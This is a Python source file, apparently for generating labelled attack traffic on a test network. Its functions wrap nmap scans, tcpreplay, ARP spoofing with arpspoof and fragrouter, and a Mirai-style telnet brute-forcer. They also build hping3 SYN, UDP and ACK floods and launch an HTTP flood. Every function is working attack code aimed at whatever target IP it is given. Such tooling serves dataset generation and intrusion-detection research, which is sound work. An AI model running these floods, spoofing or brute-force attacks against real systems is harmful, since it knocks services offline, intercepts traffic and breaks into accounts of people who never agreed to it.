import subprocess
from logger import *
import external_script.PyRai.scanner as sc
import signal
from time import sleep
import os
from attack_intensity import *
from scapy.all import *
from scapy.utils import rdpcap
import re


# ARP Scan을 사용 - 가장 빠르게 스캔이 가능하며, 포트 번호가 필요치 않음
def host_discovery(target_ip, intensity):
    print('[Host Discovery]')
    log('Start', attack_type='Host Discovery', param_info={'intensity': intensity})

    # EX) sudo nmap -sn 192.168.61.1/24 -T4
    attack_command = 'sudo nmap -sn ' + target_ip + ' -T' + str(intensity)
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    p = subprocess.Popen(attack_command_list_form, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    outs, errs = p.communicate()
    p.kill()
    print(outs)
    print(errs)

    log('End', attack_type='Host Discovery')



def tcp_replay(pcap_file, loop=1):
    print('[TCP Replay]')
    log('Start', attack_type='TCP replay', param_info={'pcap_file': pcap_file, 'loop':loop})

    attack_command=f'sudo tcpreplay -i eth0 -K --loop {loop} {pcap_file}'
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    p = subprocess.Popen(attack_command_list_form, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    outs, errs = p.communicate()

    pps=re.findall("(\d+.\d+) pps", outs.decode("utf-8"))
    
    p.kill()

    log('End', attack_type='TCP replay')
    return pps[0]

# Stealth Scan을 사용
def port_scanning(target_ip, intensity):
    print('[Port Scanning]')
    log('Start', attack_type='Port Scanning', param_info={'intensity': intensity})
    attack_command = 'sudo nmap -Pn -sS ' + target_ip + ' -T' + str(intensity)
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    p = subprocess.Popen(attack_command_list_form, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    outs, errs = p.communicate()
    p.kill()
    print(outs)
    print(errs)

    log('End', attack_type='Port Scanning')


def os_and_service_detection(target_ip, intensity):
    print('[OS & Service Detection]')
    log('Start', attack_type='Service Detection', param_info={'intensity': intensity})
    attack_command = 'sudo nmap -sS -sV -O ' + target_ip + ' -T' + str(intensity)
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    p = subprocess.Popen(attack_command_list_form, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    outs, errs = p.communicate()
    p.kill()
    print(outs)
    print(errs)

    log('End', attack_type='Service Detection')


# Spoofing
def arp_spoofing(target_ip1, target_ip2, runtime=10):
    print('[ARP Spoofing]')
    log('Start', attack_type='ARP Spoofing', param_info={'runtime': runtime})
    attack_command1 = 'sudo arpspoof -t ' + target_ip1 + ' ' + target_ip2
    attack_command_list_form1 = attack_command1.split(' ')
    attack_command2 = 'sudo arpspoof -t ' + target_ip2 + ' ' + target_ip1
    attack_command_list_form2 = attack_command2.split(' ')
    attack_command3 = 'sudo fragrouter -B1'
    attack_command_list_form3 = attack_command3.split(' ')

    log('Mid', attack_command1)
    p1 = subprocess.Popen(attack_command_list_form1, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    log('Mid', attack_command2)
    p2 = subprocess.Popen(attack_command_list_form2, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    sleep(3)
    log('Mid', attack_command3)
    p3 = subprocess.Popen(attack_command_list_form3, stdout=subprocess.PIPE, preexec_fn=os.setsid)
    sleep(runtime - 3)

    print('Killing process...')
    os.killpg(os.getpgid(p1.pid), signal.SIGTERM)
    os.killpg(os.getpgid(p2.pid), signal.SIGTERM)
    os.killpg(os.getpgid(p3.pid), signal.SIGTERM)
    sleep(10)

    log('End', attack_type='ARP Spoofing')


# 외부 스크립트 (PyRai) 사용
def scan_brute_force(target_ip, time_interval=0):   # time_interval: bruteforce 시 로그인 시도 간격
    print('[Telnet Scan & Brute-force]')
    log('Start', attack_type='Brute-force', param_info={'time_interval': time_interval})

    log('Mid', 'Brute Force at ' + target_ip)
    sc.scan23(target_ip, time_interval)

    log('End', attack_type='Brute-force')


# hping3 사용
def syn_flood(dstIP, dstPort, pps, count):
    print(f'[SYN Flooding] @ {pps}')
    log('Start', attack_type='SYN Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
    interval_us = round(10**6/pps)    # microseconds
    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -S -p {dstPort} -c {count} -q'  # + ' --rand-source'
    attack_command_list_form = attack_command.split(' ')
    print(attack_command)
    log('Mid', attack_command)
    subprocess.call(attack_command_list_form)

    log('End', attack_type='SYN Flooding')


# hping3 사용
def udp_flood(dstIP, dstPort_type, pps, count):
    byte = 60    # 데이터 크기
    print('[UDP Flooding]')
    if dstPort_type == 1:   # http port
        dstPort = 80
    elif dstPort_type == 2:   # random port
        dstPort = 'random'
    log('Start', attack_type='UDP Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count, 'byte': byte})

    interval_us = round(10**6/pps)    # microseconds
    if dstPort_type == 1:
        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p {dstPort} -c {count} -d {byte} -q'  # + ' --rand-source'
    elif dstPort_type == 2:
        attack_command = f'sudo hping3 {dstIP} -2 -i u{interval_us} -p ++1 -c {count} -d {byte} -q'  # + ' --rand-source'

    print(attack_command)
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    subprocess.call(attack_command_list_form)

    log('End', attack_type='UDP Flooding')


# httpflood.py에 별도 구현
def http_flood(target, dstPort, pps, count):
    print('[HTTP Flooding]')
    log('Start', attack_type='HTTP Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
    attack_command = f'python3 httpflood.py -t {target} -p {dstPort} -i {pps} -c {count}'
    print(attack_command)
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    subprocess.call(attack_command_list_form)

    log('End', attack_type='HTTP Flooding')


# hping3 사용
def ack_flood(dstIP, dstPort, pps, count):
    print('[ACK Flooding]')
    log('Start', attack_type='ACK Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
    interval_us = round(10**6/pps)    # microseconds
    attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -A -p {dstPort} -c {count} -q'  # + ' --rand-source'
    attack_command_list_form = attack_command.split(' ')

    log('Mid', attack_command)
    subprocess.call(attack_command_list_form)

    log('End', attack_type='ACK Flooding')
